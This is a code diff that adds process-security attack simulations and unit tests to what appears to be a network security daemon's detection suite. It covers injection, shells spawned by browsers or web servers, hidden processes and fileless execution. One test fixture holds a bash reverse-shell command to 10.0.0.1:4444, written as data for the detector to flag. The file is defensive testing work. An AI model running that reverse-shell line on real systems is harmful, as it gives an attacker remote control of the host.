@@ -9,6 +9,7 @@ This module simulates attack scenarios across different network types:
 - Threat Intelligence: TOR exit nodes, C2 servers, botnets, blacklisted IPs, beaconing
 - File Integrity: Hash verification, config tampering, binary modification, permission changes
 - Traffic Anomaly: Port scanning, data exfiltration, unusual ports, covert channels
+- Process Security: Injection, unusual parent-child, hidden processes, privilege escalation
 - Cellular: IMSI catcher/Stingray attacks (2G downgrade, tower spoofing)
 - WiFi: Rogue AP, deauthentication attacks
 - Ethernet: USB/storage insertion attacks
@@ -47,6 +48,9 @@ from daemon.security.file_integrity import (
 )
 from daemon.security.traffic_anomaly import (
     TrafficAnomalyMonitor, TrafficAnomalyConfig, TrafficAnomalyAlert, TrafficAnomaly
+)
+from daemon.security.process_security import (
+    ProcessSecurityMonitor, ProcessSecurityConfig, ProcessSecurityAlert, ProcessAlert
 )
 
 
@@ -1272,6 +1276,111 @@ class TrafficAnomalyAttackSimulator:
         return anomalies
 
 
+class ProcessSecurityAttackSimulator:
+    """Simulates process security attack scenarios"""
+
+    def __init__(self, monitor: ProcessSecurityMonitor):
+        self.monitor = monitor
+
+    def simulate_ptrace_injection(self) -> ProcessAlert:
+        """
+        Simulate ptrace-based process injection.
+        """
+        return self.monitor.detect_injection(
+            target_pid=1234,
+            injection_type="ptrace",
+            source_pid=5678,
+            details={'technique': 'PTRACE_ATTACH'}
+        )
+
+    def simulate_ld_preload_injection(self) -> List[ProcessAlert]:
+        """
+        Simulate LD_PRELOAD injection.
+        """
+        return self.monitor.analyze_process(
+            pid=1234,
+            name="victim_process",
+            ppid=1,
+            cmdline="/usr/bin/victim_process",
+            exe="/usr/bin/victim_process",
+            uid=1000,
+            environ={'LD_PRELOAD': '/tmp/malicious.so'}
+        )
+
+    def simulate_browser_shell_spawn(self) -> ProcessAlert:
+        """
+        Simulate browser spawning a shell (exploit indicator).
+        """
+        return self.monitor.detect_unusual_parent(
+            child_pid=5678,
+            child_name="bash",
+            parent_pid=1234,
+            parent_name="chrome",
+            reason="browser spawned shell"
+        )
+
+    def simulate_service_shell_spawn(self) -> ProcessAlert:
+        """
+        Simulate service spawning a shell (webshell indicator).
+        """
+        return self.monitor.detect_unusual_parent(
+            child_pid=5678,
+            child_name="sh",
+            parent_pid=1234,
+            parent_name="nginx",
+            reason="web server spawned shell"
+        )
+
+    def simulate_hidden_process(self) -> ProcessAlert:
+        """
+        Simulate hidden process detection.
+        """
+        return self.monitor.detect_hidden_process(
+            pid=31337,
+            detection_method="proc_vs_ps",
+            details={'hiding_technique': 'rootkit'}
+        )
+
+    def simulate_deleted_executable(self) -> List[ProcessAlert]:
+        """
+        Simulate process with deleted executable (memory-only malware).
+        """
+        return self.monitor.analyze_process(
+            pid=9999,
+            name="suspicious",
+            ppid=1,
+            cmdline="./malware",
+            exe="/tmp/malware (deleted)",
+            uid=0
+        )
+
+    def simulate_suspicious_cmdline(self) -> List[ProcessAlert]:
+        """
+        Simulate process with suspicious command line (reverse shell).
+        """
+        return self.monitor.analyze_process(
+            pid=8888,
+            name="bash",
+            ppid=1,
+            cmdline="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+            exe="/bin/bash",
+            uid=1000
+        )
+
+    def simulate_memfd_execution(self) -> List[ProcessAlert]:
+        """
+        Simulate fileless malware via memfd.
+        """
+        return self.monitor.analyze_process(
+            pid=7777,
+            name="payload",
+            ppid=1,
+            cmdline="",
+            exe="memfd:payload",
+            uid=0
+        )
+
+
 class TestARPAttacks(unittest.TestCase):
     """Test suite for ARP attack detection"""
 
@@ -1869,6 +1978,136 @@ class TestTrafficAnomalyAttacks(unittest.TestCase):
         self.assertTrue(icmp_detected, f"ICMP tunnel not detected. Anomalies: {anomalies}")
 
 
+class TestProcessSecurityAttacks(unittest.TestCase):
+    """Test suite for process security attack detection"""
+
+    def setUp(self):
+        self.config = ProcessSecurityConfig(
+            detect_injection=True,
+            detect_hierarchy_anomalies=True,
+            detect_hidden_processes=True,
+            detect_privilege_escalation=True,
+        )
+        self.monitor = ProcessSecurityMonitor(config=self.config)
+        self.simulator = ProcessSecurityAttackSimulator(self.monitor)
+
+    def test_ptrace_injection_detection(self):
+        """Test detection of ptrace-based injection"""
+        alert = self.simulator.simulate_ptrace_injection()
+
+        injection_detected = alert.alert_type == ProcessSecurityAlert.PTRACE_ATTACH
+
+        if injection_detected:
+            results.add_pass("Ptrace Injection", "Detected ptrace attach attempt")
+        else:
+            results.add_fail("Ptrace Injection", "Failed to detect ptrace injection")
+
+        self.assertTrue(injection_detected, f"Ptrace injection not detected. Alert: {alert}")
+
+    def test_ld_preload_injection_detection(self):
+        """Test detection of LD_PRELOAD injection"""
+        alerts = self.simulator.simulate_ld_preload_injection()
+
+        injection_detected = any(
+            alert.alert_type == ProcessSecurityAlert.LD_PRELOAD_INJECTION
+            for alert in alerts
+        )
+
+        if injection_detected:
+            results.add_pass("LD_PRELOAD Injection", "Detected LD_PRELOAD manipulation")
+        else:
+            results.add_fail("LD_PRELOAD Injection", "Failed to detect LD_PRELOAD injection")
+
+        self.assertTrue(injection_detected, f"LD_PRELOAD injection not detected. Alerts: {alerts}")
+
+    def test_browser_shell_spawn_detection(self):
+        """Test detection of browser spawning shell"""
+        alert = self.simulator.simulate_browser_shell_spawn()
+
+        spawn_detected = alert.alert_type == ProcessSecurityAlert.BROWSER_SPAWN_SHELL
+
+        if spawn_detected:
+            results.add_pass("Browser Shell Spawn", "Detected browser spawning shell")
+        else:
+            results.add_fail("Browser Shell Spawn", "Failed to detect browser shell spawn")
+
+        self.assertTrue(spawn_detected, f"Browser shell spawn not detected. Alert: {alert}")
+
+    def test_service_shell_spawn_detection(self):
+        """Test detection of service spawning shell (webshell)"""
+        alert = self.simulator.simulate_service_shell_spawn()
+
+        spawn_detected = alert.alert_type == ProcessSecurityAlert.SHELL_SPAWN_FROM_SERVICE
+
+        if spawn_detected:
+            results.add_pass("Service Shell Spawn", "Detected service spawning shell")
+        else:
+            results.add_fail("Service Shell Spawn", "Failed to detect service shell spawn")
+
+        self.assertTrue(spawn_detected, f"Service shell spawn not detected. Alert: {alert}")
+
+    def test_hidden_process_detection(self):
+        """Test detection of hidden processes"""
+        alert = self.simulator.simulate_hidden_process()
+
+        hidden_detected = alert.alert_type == ProcessSecurityAlert.HIDDEN_PROCESS
+
+        if hidden_detected:
+            results.add_pass("Hidden Process", "Detected hidden process")
+        else:
+            results.add_fail("Hidden Process", "Failed to detect hidden process")
+
+        self.assertTrue(hidden_detected, f"Hidden process not detected. Alert: {alert}")
+
+    def test_deleted_executable_detection(self):
+        """Test detection of deleted executable"""
+        alerts = self.simulator.simulate_deleted_executable()
+
+        deleted_detected = any(
+            alert.alert_type == ProcessSecurityAlert.DELETED_EXECUTABLE
+            for alert in alerts
+        )
+
+        if deleted_detected:
+            results.add_pass("Deleted Executable", "Detected process with deleted binary")
+        else:
+            results.add_fail("Deleted Executable", "Failed to detect deleted executable")
+
+        self.assertTrue(deleted_detected, f"Deleted executable not detected. Alerts: {alerts}")
+
+    def test_suspicious_cmdline_detection(self):
+        """Test detection of suspicious command line (reverse shell)"""
+        alerts = self.simulator.simulate_suspicious_cmdline()
+
+        cmdline_detected = any(
+            alert.alert_type == ProcessSecurityAlert.SUSPICIOUS_CMDLINE
+            for alert in alerts
+        )
+
+        if cmdline_detected:
+            results.add_pass("Suspicious Command Line", "Detected reverse shell command")
+        else:
+            results.add_fail("Suspicious Command Line", "Failed to detect suspicious cmdline")
+
+        self.assertTrue(cmdline_detected, f"Suspicious cmdline not detected. Alerts: {alerts}")
+
+    def test_memfd_execution_detection(self):
+        """Test detection of memfd execution (fileless malware)"""
+        alerts = self.simulator.simulate_memfd_execution()
+
+        memfd_detected = any(
+            alert.alert_type == ProcessSecurityAlert.CODE_INJECTION
+            for alert in alerts
+        )
+
+        if memfd_detected:
+            results.add_pass("Memfd Execution", "Detected fileless malware via memfd")
+        else:
+            results.add_fail("Memfd Execution", "Failed to detect memfd execution")
+
+        self.assertTrue(memfd_detected, f"Memfd execution not detected. Alerts: {alerts}")
+
+
 class TestCellularAttacks(unittest.TestCase):
     """Test suite for cellular/IMSI catcher attack detection"""
 
@@ -2265,6 +2504,16 @@ class TestMonitoringToggle(unittest.TestCase):
 
         results.add_pass("Traffic Anomaly Toggle", "Traffic anomaly monitoring can be toggled")
 
+    def test_process_security_toggle(self):
+        """Test process security monitoring toggle"""
+        self.monitor.set_monitor_process_security(False)
+        self.assertFalse(self.monitor.monitoring_config.monitor_process_security)
+
+        self.monitor.set_monitor_process_security(True)
+        self.assertTrue(self.monitor.monitoring_config.monitor_process_security)
+
+        results.add_pass("Process Security Toggle", "Process security monitoring can be toggled")
+
 
 def run_all_simulations():
     """Run all attack simulations and print summary"""
@@ -2285,6 +2534,7 @@ def run_all_simulations():
     suite.addTests(loader.loadTestsFromTestCase(TestThreatIntelAttacks))
     suite.addTests(loader.loadTestsFromTestCase(TestFileIntegrityAttacks))
     suite.addTests(loader.loadTestsFromTestCase(TestTrafficAnomalyAttacks))
+    suite.addTests(loader.loadTestsFromTestCase(TestProcessSecurityAttacks))
     suite.addTests(loader.loadTestsFromTestCase(TestCellularAttacks))
     suite.addTests(loader.loadTestsFromTestCase(TestWiFiAttacks))
     suite.addTests(loader.loadTestsFromTestCase(TestEthernetAttacks))
